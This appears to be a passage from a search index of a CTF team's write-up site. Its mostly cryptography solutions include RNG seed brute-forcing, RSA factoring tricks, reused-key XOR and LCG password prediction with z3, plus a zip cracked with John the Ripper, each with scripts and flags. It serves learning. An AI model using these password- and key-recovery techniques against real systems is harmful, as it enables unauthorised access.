.duration_since(SystemTime::UNIX_EPOCH) .expect(\"Time is broken\") .as_secs(); return StdRng::seed_from_u64(seed); } fn rand_xor(input : String) -> String { let mut rng = get_rng(); return input .chars() .into_iter() .map(|c| format!(\"{:02x}\", (c as u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let flag = fs::read_to_string(\"flag.txt\")?; let xored = rand_xor(flag); println!(\"{}\", xored); let mut file = fs::File::create(\"out.txt\")?; file.write(xored.as_bytes())?; Ok(()) } Output: 418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807 Using time as the seed is the vulnerability here as only the last few digits are going to be changed in 2 different particular times and therefore, the seed can be bruteforced. In this problem the range to be considered was quite large. Here's the solution script use rand::{Rng, SeedableRng, rngs::StdRng}; use std::fs; use std::io::Write; use std::time::SystemTime; extern crate hex; fn get_rng(seed : u64) -> StdRng { return StdRng::seed_from_u64(seed); } fn rand_xor(input : &Vec<u8>,seed:u64) -> String { let mut rng = get_rng(seed); return input .into_iter() .map(|c| format!(\"{:02x}\", (c as &u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let mut seed=1618000000; let s1 = String::from(\"418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807\"); let decoded = hex::decode(s1).expect(\"Decoding failed\"); let mut file = fs::File::create(\"out.txt\")?; while seed <1619000000{ let xored = format!(\"{}\\n\", rand_xor(&decoded,seed)); seed +=1; file.write_all(xored.as_bytes())?; } Ok(()) } Flag: CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}","title":"Soul Crabber 2"},{"location":"crypto/CyberApocalypseCTF/Wii_Phit/","text":"Wii Phit Solved by: Sowmya (@__4lph4__) This was an interesting challenge from Cyber Apocalypse CTF 2021. This challenge is based on Number Theory and I really liked the way this challenge was created. Here's the challenge script for understanding the challenge: from Crypto.Util.number import bytes_to_long from secrets import FLAG,p,q N = p**3 * q e = 0x10001 c = pow(bytes_to_long(FLAG),e,N) print(f'Flag: {hex(c)}') # Hint w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 x = p + 1328 y = p + 1329 z = q - 1 assert w*(x*z + y*z - x*y) == 4*x*y*z Parameter given to us: Flag: 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 Getting into my initial approach, I first tried elaborating this: assert w*(x*z + y*z - x*y) == 4*x*y*z thinking that it would give me a relation in one of the primes of the modulus. But that didn't work out. On staring at the equation for sometime, I found it similar to one the maths algebra kind of relation. Rearranging the equation gave me this equation: 4/w = 1/x + 1/y - 1/z I searched for similar equations on the internet and I luckily found this According to the above link w = n x = (n-1)/2 y = (n+1)/2 z = n(n-1)(n+1)/4 Once we get x,y,z we can simply get the prime factors p,q with which we can construct Modulus N and phi(n) to solve the RSA problem. Solution script: from Crypto.Util.number import * w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 flag = 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 x = (w-1)//2 y = (w+1)//2 z = w*x*y p = x - 1328 q = z + 1 N = p**3 * q e = 65537 phin = (p-1)*(p**2)*(q-1) d = inverse(e,phin) flag = long_to_bytes(pow(flag,d,N)) print(flag) On running the script, we get the flag: CHTB{Erdos-Straus-Conjecture}","title":"Wii Phit"},{"location":"crypto/CyberApocalypseCTF/Wii_Phit/#wii-phit","text":"Solved by: Sowmya (@__4lph4__) This was an interesting challenge from Cyber Apocalypse CTF 2021. This challenge is based on Number Theory and I really liked the way this challenge was created. Here's the challenge script for understanding the challenge: from Crypto.Util.number import bytes_to_long from secrets import FLAG,p,q N = p**3 * q e = 0x10001 c = pow(bytes_to_long(FLAG),e,N) print(f'Flag: {hex(c)}') # Hint w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 x = p + 1328 y = p + 1329 z = q - 1 assert w*(x*z + y*z - x*y) == 4*x*y*z Parameter given to us: Flag: 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 Getting into my initial approach, I first tried elaborating this: assert w*(x*z + y*z - x*y) == 4*x*y*z thinking that it would give me a relation in one of the primes of the modulus. But that didn't work out. On staring at the equation for sometime, I found it similar to one the maths algebra kind of relation. Rearranging the equation gave me this equation: 4/w = 1/x + 1/y - 1/z I searched for similar equations on the internet and I luckily found this According to the above link w = n x = (n-1)/2 y = (n+1)/2 z = n(n-1)(n+1)/4 Once we get x,y,z we can simply get the prime factors p,q with which we can construct Modulus N and phi(n) to solve the RSA problem. Solution script: from Crypto.Util.number import * w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 flag = 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 x = (w-1)//2 y = (w+1)//2 z = w*x*y p = x - 1328 q = z + 1 N = p**3 * q e = 65537 phin = (p-1)*(p**2)*(q-1) d = inverse(e,phin) flag = long_to_bytes(pow(flag,d,N)) print(flag) On running the script, we get the flag: CHTB{Erdos-Straus-Conjecture}","title":"Wii Phit"},{"location":"crypto/CyberApocalypseCTF/Phasestream3/readme/","text":"Phasestream3 Description On looking at phasestream3.py, we get to know that key used for AES-CTR is reused, which makes it similar to XOR. We also have a known plaintext and the ciphertext of it, using which we find the key. The key found here is used for decrypting the flag. Ciphertext of known plaintext: 464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c Ciphertext of flag: 4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea flag = CHTB{r3u53d_k3Y_4TT4cK}","title":"Readme"},{"location":"crypto/CyberApocalypseCTF/Phasestream3/readme/#phasestream3","text":"","title":"Phasestream3"},{"location":"crypto/CyberApocalypseCTF/Phasestream3/readme/#description","text":"On looking at phasestream3.py, we get to know that key used for AES-CTR is reused, which makes it similar to XOR. We also have a known plaintext and the ciphertext of it, using which we find the key. The key found here is used for decrypting the flag. Ciphertext of known plaintext: 464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c Ciphertext of flag: 4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea flag = CHTB{r3u53d_k3Y_4TT4cK}","title":"Description"},{"location":"crypto/SunshineCTF/MR.ROBOT/readme/","text":"MR.ROBOT -Crypto Sloved by - ph03n1x Description ```What I'm about to tell you c3Vue2 is top secret. A conspiracy hlbG bigger than all of us. There's a powerful group of people out there that are secretly running the world. I'm talking about the xvX3dv guys no one knows about, the ones that are invisible. The top 1% of the top 1%, the cmxk guys that play God without permission. And now I think they're fQ== following me. ### Idea Read the given challenge description carefully, bring all base64 strings together in a order and use base64 module for converting base64 to bytes #### Script import base64 a = \"c3Vue2hlbGxvX3dvcmxkfQ==\" pt = base64.b64decode(a) print(pt) ``` flag b'sun{hello_world}'","title":"MR.ROBOT -Crypto"},{"location":"crypto/SunshineCTF/MR.ROBOT/readme/#mrrobot-crypto","text":"","title":"MR.ROBOT -Crypto"},{"location":"crypto/SunshineCTF/MR.ROBOT/readme/#sloved-by-ph03n1x","text":"","title":"Sloved by - ph03n1x"},{"location":"crypto/SunshineCTF/MR.ROBOT/readme/#description","text":"```What I'm about to tell you c3Vue2 is top secret. A conspiracy hlbG bigger than all of us. There's a powerful group of people out there that are secretly running the world. I'm talking about the xvX3dv guys no one knows about, the ones that are invisible. The top 1% of the top 1%, the cmxk guys that play God without permission. And now I think they're fQ== following me. ### Idea Read the given challenge description carefully, bring all base64 strings together in a order and use base64 module for converting base64 to bytes #### Script import base64 a = \"c3Vue2hlbGxvX3dvcmxkfQ==\" pt = base64.b64decode(a) print(pt) ```","title":"Description"},{"location":"crypto/SunshineCTF/MR.ROBOT/readme/#flag","text":"b'sun{hello_world}'","title":"flag"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/","text":"MultipleExponents - Crypto Sloved by - pavani Description Both Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them. Author: Ratman#4736 Writeup Attack :Common modules We have one modulus, two exponents and two ciphertexts Equations: gcd(e1,e2) = 1 => e1 * u +e2 * v = 1 ---->1 C1 = M^{e_1} mod n , C2 = M^{e_2} mod n M^{e_1*u}*M^{e_2*v} = M^{e_1*u+e_2*v} = M^1 = M --->2 Now use Extended Euclid Algorithm on equation1 to get u,v; Use xgcd in sagemath to get u,v respectively If u < 0 , find inverse of C1 mod n .If v<0 ,then find the inverse of C2 mod n As I got u < 0, I found inverse of C1.Now, according to equation-3 compute M = c_1^u*c_2_{inv}^{-v} Script solution.py Flag sun{d0n7_d0_m0r3_th4n_0ne_3xp0n3nt}","title":"MultipleExponents - Crypto"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/#multipleexponents-crypto","text":"","title":"MultipleExponents - Crypto"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/#sloved-by-pavani","text":"","title":"Sloved by - pavani"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/#description","text":"Both Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them. Author: Ratman#4736","title":"Description"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/#writeup","text":"Attack :Common modules We have one modulus, two exponents and two ciphertexts Equations: gcd(e1,e2) = 1 => e1 * u +e2 * v = 1 ---->1 C1 = M^{e_1} mod n , C2 = M^{e_2} mod n M^{e_1*u}*M^{e_2*v} = M^{e_1*u+e_2*v} = M^1 = M --->2 Now use Extended Euclid Algorithm on equation1 to get u,v; Use xgcd in sagemath to get u,v respectively If u < 0 , find inverse of C1 mod n .If v<0 ,then find the inverse of C2 mod n As I got u < 0, I found inverse of C1.Now, according to equation-3 compute M = c_1^u*c_2_{inv}^{-v}","title":"Writeup"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/#script","text":"solution.py","title":"Script"},{"location":"crypto/SunshineCTF/MultipleExponent/readme/#flag","text":"sun{d0n7_d0_m0r3_th4n_0ne_3xp0n3nt}","title":"Flag"},{"location":"crypto/TamuCTF/ciphper/","text":"Ciphper Solved by: Sowmya (@__4lph4__) Description: Background story: this code was once used on a REAL site to encrypt REAL data. Thankfully, this code is no longer being used and has not for a long time. A long time ago, one of the sites I was building needed to store some some potentially sensitive data. I did not know how to use any proper encryption techniques, so I wrote my own symmetric cipher. The encrypted content in output.bin is a well-known, olde English quote in lowercase ASCII alphabetic characters. No punctuation; just letters and spaces. The flag is key to understanding this message. Take a look at the challenge script for better understanding: <?php function secure_crypt($str, $key) { if (!$key) { return $str; } if (strlen($key) < 8) { exit(\"key error\"); } $n = strlen($key) < 32 ? strlen($key) : 32; for ($i = 0; $i < strlen($str); $i++) { $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); } return $str; } Output: sf'gh;k}.zqf/xc>{j5fvnc.wp2mxq/lrltqdtj/y|{fgi~>mff2p`ub{q2p~4{ub)jlc\u007f${a4mgijil9{}w>|{gpda9qzk=f{ujzh$`h4qg{~my|``a>ix|jv||0{}=sf'qlpa/ofsa/mk\u007fpaff>n7}{b2vv4{oh|eihh$n`p>pv,cni`f{ph7kpg2mxqb Through the code given, it can be understood that this is a classical multi byte xor with a small modification. Observe the line: $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); Other than the XOR operation there is an extra AND operation. On some observation I found that this AND operation converts ord(a) to 1 , ord(b) to 2 , ord(c) to 3 .. Next, I used the flag format 'gigem{' to find the first few characters of the quote. After getting the quote characters, some googling helped me in finding the correct quote which I used for finding the key. Key found is random bytes because of &0x1f . It was further decoded to get the flag bytes. Doing all this gave me the flag as: gigem{dont\\^roll\\^your\\^own\\^crypto} which wasn't correct on submission. Finally, I understood that ^ and ~ give the same output due to the AND operation. So after changing ^ characters to ~ gave me the flag. Flag: gigem{dont~roll~your~own~crypto}","title":"Ciphper"},{"location":"crypto/TamuCTF/ciphper/#ciphper","text":"Solved by: Sowmya (@__4lph4__) Description: Background story: this code was once used on a REAL site to encrypt REAL data. Thankfully, this code is no longer being used and has not for a long time. A long time ago, one of the sites I was building needed to store some some potentially sensitive data. I did not know how to use any proper encryption techniques, so I wrote my own symmetric cipher. The encrypted content in output.bin is a well-known, olde English quote in lowercase ASCII alphabetic characters. No punctuation; just letters and spaces. The flag is key to understanding this message. Take a look at the challenge script for better understanding: <?php function secure_crypt($str, $key) { if (!$key) { return $str; } if (strlen($key) < 8) { exit(\"key error\"); } $n = strlen($key) < 32 ? strlen($key) : 32; for ($i = 0; $i < strlen($str); $i++) { $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); } return $str; } Output: sf'gh;k}.zqf/xc>{j5fvnc.wp2mxq/lrltqdtj/y|{fgi~>mff2p`ub{q2p~4{ub)jlc\u007f${a4mgijil9{}w>|{gpda9qzk=f{ujzh$`h4qg{~my|``a>ix|jv||0{}=sf'qlpa/ofsa/mk\u007fpaff>n7}{b2vv4{oh|eihh$n`p>pv,cni`f{ph7kpg2mxqb Through the code given, it can be understood that this is a classical multi byte xor with a small modification. Observe the line: $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); Other than the XOR operation there is an extra AND operation. On some observation I found that this AND operation converts ord(a) to 1 , ord(b) to 2 , ord(c) to 3 .. Next, I used the flag format 'gigem{' to find the first few characters of the quote. After getting the quote characters, some googling helped me in finding the correct quote which I used for finding the key. Key found is random bytes because of &0x1f . It was further decoded to get the flag bytes. Doing all this gave me the flag as: gigem{dont\\^roll\\^your\\^own\\^crypto} which wasn't correct on submission. Finally, I understood that ^ and ~ give the same output due to the AND operation. So after changing ^ characters to ~ gave me the flag. Flag: gigem{dont~roll~your~own~crypto}","title":"Ciphper"},{"location":"crypto/TamuCTF/encoding/encod/","text":"ENCODING Description: This is literally the flag but obfuscated through tons of different encoding schemes. data.txt File attached Solution: Simple decoding of the data given in data.txt . The decoding in the order: Octal--> hex--> binary--> base32. Flag: gigem{3nc0ding_1s_n0t_crypt0_428427}","title":"ENCODING"},{"location":"crypto/TamuCTF/encoding/encod/#encoding","text":"","title":"ENCODING"},{"location":"crypto/TamuCTF/encoding/encod/#description","text":"This is literally the flag but obfuscated through tons of different encoding schemes. data.txt File attached","title":"Description:"},{"location":"crypto/TamuCTF/encoding/encod/#solution","text":"Simple decoding of the data given in data.txt . The decoding in the order: Octal--> hex--> binary--> base32.","title":"Solution:"},{"location":"crypto/TamuCTF/encoding/encod/#flag","text":"gigem{3nc0ding_1s_n0t_crypt0_428427}","title":"Flag:"},{"location":"crypto/TamuCTF/pwngen/writeup/","text":"TamuCTF pwngen Challenge points : 150 Challenge solves : 10 Description ( not the exact description ) It has been found that a set of passwords have been generated using the given script.We have reason to believe that they generated a set of passwords at the same time using a custom password generation program and that their previous password was ElxFr9)F . Send the next password at openssl s_client -connect tamuctf.com:443 -servername pwgen -quiet . Files : main.rs Writeup Author : ph03n1x TL;DR 1. Given the equation of a Linear congruential generator (LCG) and the previous password generated using it 2. Use z3 to find the seed with the given contraints. 3. Find the seed and get the next password from it. Solution On inspecting the file we understand that it is a LCG generator. We decided to give it a try with z3 python, so we decided to rewrite the functions in python (becuase we were more familiar with python than rust):- class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : l = [] for i in range(8) : l.append(chr(rand.next()%94 + 33)) return ''.join(l) The code should produce the same output as the given rs file. Now we simply used z3 to setup the contraints and find the seed :- from z3 import * known = 'ElxFr9)F' class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : return URem(rand.next(),94) + 33 s = Solver() seed = BitVec(\"seed\",32) l = LCG(seed) for i in known : s.add(get_pass(l) == ord(i)) s.check() seed = s.model()[seed] We get our seed as seed = 718549711 . ( Note : Make sure you use modify the class to the inital class definition since the second one has been slightly modified to take in z3 objects) Now let's predict the password :- seed = 718549711 l = LCG(seed) print(get_pass(l) ) # output : 'ElxFr9)F' get_pass(l) # output 'xV!;28vj' Now to connect to the server and send the password :- Flag : gigem{cryp706r4ph1c4lly_1n53cur3_prn65_DC6F9B}","title":"TamuCTF"},{"location":"crypto/TamuCTF/pwngen/writeup/#tamuctf","text":"","title":"TamuCTF"},{"location":"crypto/TamuCTF/pwngen/writeup/#pwngen","text":"Challenge points : 150 Challenge solves : 10","title":"pwngen"},{"location":"crypto/TamuCTF/pwngen/writeup/#description","text":"( not the exact description ) It has been found that a set of passwords have been generated using the given script.We have reason to believe that they generated a set of passwords at the same time using a custom password generation program and that their previous password was ElxFr9)F . Send the next password at openssl s_client -connect tamuctf.com:443 -servername pwgen -quiet . Files : main.rs","title":"Description"},{"location":"crypto/TamuCTF/pwngen/writeup/#writeup","text":"Author : ph03n1x TL;DR 1. Given the equation of a Linear congruential generator (LCG) and the previous password generated using it 2. Use z3 to find the seed with the given contraints. 3. Find the seed and get the next password from it.","title":"Writeup"},{"location":"crypto/TamuCTF/pwngen/writeup/#solution","text":"On inspecting the file we understand that it is a LCG generator. We decided to give it a try with z3 python, so we decided to rewrite the functions in python (becuase we were more familiar with python than rust):- class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : l = [] for i in range(8) : l.append(chr(rand.next()%94 + 33)) return ''.join(l) The code should produce the same output as the given rs file. Now we simply used z3 to setup the contraints and find the seed :- from z3 import * known = 'ElxFr9)F' class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : return URem(rand.next(),94) + 33 s = Solver() seed = BitVec(\"seed\",32) l = LCG(seed) for i in known : s.add(get_pass(l) == ord(i)) s.check() seed = s.model()[seed] We get our seed as seed = 718549711 . ( Note : Make sure you use modify the class to the inital class definition since the second one has been slightly modified to take in z3 objects) Now let's predict the password :- seed = 718549711 l = LCG(seed) print(get_pass(l) ) # output : 'ElxFr9)F' get_pass(l) # output 'xV!;28vj' Now to connect to the server and send the password :- Flag : gigem{cryp706r4ph1c4lly_1n53cur3_prn65_DC6F9B}","title":"Solution"},{"location":"crypto/dCTF/strong_pwd/","text":"dCTF Strong password - Given is a password protected zip file - On using the tool JohnTheRipper , we find the password= Bo38AkRcE600X8DbK3600 - Opening the zip file, we find a lorem_ipsum text - $ strings lorem_ipsum.txt | grep dctf gives the flag: dctf{r0cKyoU_f0r_tHe_w1n}","title":"dCTF"},{"location":"crypto/dCTF/strong_pwd/#dctf","text":"","title":"dCTF"},{"location":"crypto/dCTF/strong_pwd/#strong-password","text":"- Given is a password protected zip file - On using the tool JohnTheRipper , we find the password= Bo38AkRcE600X8DbK3600 - Opening the zip file, we find a lorem_ipsum text - $ strings lorem_ipsum.txt | grep dctf gives the flag: dctf{r0cKyoU_f0r_tHe_w1n}","title":"Strong password"},{"location":"crypto/zhero/public/read/","text":"Alice_bob_dave - Crypto Sloved by - Sowmya (@__4lph4__) , Pavani(@PavaniPoluru) Description Alice and Bob are sending their flags to Dave. But sadly Dave lost the modulus :( Try to retrive the flag! This is a intresting RSA challenge. where we have to find modulous (n) from ct,d,e. I used sage to find n_a and n_b. RSA equations known ```d \u2261 e^1 mod phin(n) d e \u2261 1 mod phin(n) => d e = k phin(n)+1 => da e-1 = k(p-1)*(q-1) pt = long_to_bytes(pow(ct,d,n)) ct = long_to_bytes(pow(pt,e,n)) ``d*e = k*phin(n)+1`` From this try to find phin_a,phin_b ``phi(n = (p-1)*(q-1)`` ```phin_a = (d_a * e)-1 phin_b = (d_b * e) -1 ``` we can find factors of p and brutefroce it with conditions is_prime and size(1024) ``` sage: for i in range(1,10000): ....: p = ((GCD(phin_a,phin_b) // i) + 1) ....: if (is_prime(p) == 1) and (size(p) == 1024): ....: print(p) ....: print(i) ....: print(size(p)) ....: ``` find q,r in the same way `` p=177279130816191665059944783286411855023035031289227941571673915784074353287733189099688126318264113305321082059619767094038966996649561164342515779196140056547333435193040798074799909334916510316728847254833619137382153503950749154356946058670079132324988450725735937306884337410304401871741381990982764516163 `` Now we know p >> n_a = p * q >> n_b = p * r ```pt_a = long_to_bytes(pow(ct_a,d_a,p)) pt_b = long_to_bytes(pow(ct_b,d_b,p)) Using this above equation find pt_a and pt_b we can get pt_a + pt_b as: b'Hey Dave its Alice here.My flag is zh3r0{GCD_c0m3s_' b'Hey Dave its Bob here.My flag is 70_R3sCue_3742986}' FLAG - zh3r0{GCD_c0m3s_70_R3sCue_3742986}","title":"Alice_bob_dave - Crypto"},{"location":"crypto/zhero/public/read/#alice_bob_dave-crypto","text":"","title":"Alice_bob_dave - Crypto"},{"location":"crypto/zhero/public/read/#sloved-by-sowmya-__4lph4__-pavanipavanipoluru","text":"","title":"Sloved by - Sowmya (@__4lph4__) , Pavani(@PavaniPoluru)"},{"location":"crypto/zhero/public/read/#description","text":"Alice and Bob are sending their flags to Dave. But sadly Dave lost the modulus :( Try to retrive the flag! This is a intresting RSA challenge. where we have to find modulous (n) from ct,d,e. I used sage to find n_a and n_b.","title":"Description"},{"location":"crypto/zhero/public/read/#rsa-equations-known","text":"```d \u2261 e^1 mod phin(n) d e \u2261 1 mod phin(n) => d e = k phin(n)+1 => da e-1 = k(p-1)*(q-1) pt = long_to_bytes(pow(ct,d,n)) ct = long_to_bytes(pow(pt,e,n)) ``d*e = k*phin(n)+1`` From this try to find phin_a,phin_b ``phi(n = (p-1)*(q-1)`` ```phin_a = (d_a * e)-1 phin_b = (d_b * e) -1 ``` we can find factors of p and brutefroce it with conditions is_prime and size(1024) ``` sage: for i in range(1,10000): ....: p = ((GCD(phin_a,phin_b) // i) + 1) ....: if (is_prime(p) == 1) and (size(p) == 1024): ....: print(p) ....: print(i) ....: print(size(p)) ....: ``` find q,r in the same way `` p=177279130816191665059944783286411855023035031289227941571673915784074353287733189099688126318264113305321082059619767094038966996649561164342515779196140056547333435193040798074799909334916510316728847254833619137382153503950749154356946058670079132324988450725735937306884337410304401871741381990982764516163 `` Now we know p >> n_a = p * q >> n_b = p * r ```pt_a = long_to_bytes(pow(ct_a,d_a,p)) pt_b = long_to_bytes(pow(ct_b,d_b,p)) Using this above equation find pt_a and pt_b we can get pt_a + pt_b as: b'Hey Dave its Alice here.My flag is zh3r0{GCD_c0m3s_' b'Hey Dave its Bob here.My flag is 70_R3sCue_3742986}'","title":"RSA equations known"},{"location":"crypto/zhero/public/read/#flag-zh3r0gcd_c0m3s_70_r3scue_3742986","text":"","title":"FLAG - zh3r0{GCD_c0m3s_70_R3sCue_3742986}"},{"location":"forensics/intro/","text":"Forensics Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from Forensics category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. DarkCTF Knot-65 - v1Ru5 Powershell - v1Ru5 TJCTF Rap God - v1Ru5 TamuCTF Recovery - v1Ru5 DawgCTF Deserted Island Toolkit - Arya Arun These Ladies Paved Your Way - Arya Arun Moses - Arya Arun Tag - v1Ru5 TAMUCTF22 Taxes - v1Ru5 Vanity - v1Ru5 Whats the difference - Arya Arun","title":"Forensics"},{"location":"forensics/intro/#forensics","text":"","title":"Forensics"},{"location":"forensics/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from Forensics category.","title":"Introduction"},{"location":"forensics/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. DarkCTF Knot-65 - v1Ru5 Powershell - v1Ru5 TJCTF Rap God - v1Ru5 TamuCTF Recovery - v1Ru5 DawgCTF Deserted Island Toolkit - Arya Arun These Ladies Paved Your Way - Arya Arun Moses - Arya Arun Tag - v1Ru5 TAMUCTF22 Taxes - v1Ru5 Vanity - v1Ru5 Whats the difference - Arya Arun","title":"The contents of this repo"},{"location":"forensics/DarkCTF/Knot-65/Knot/","text":"Knot-65 Description Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password. Solution So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open(\"file.txt\",\"r\") r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is 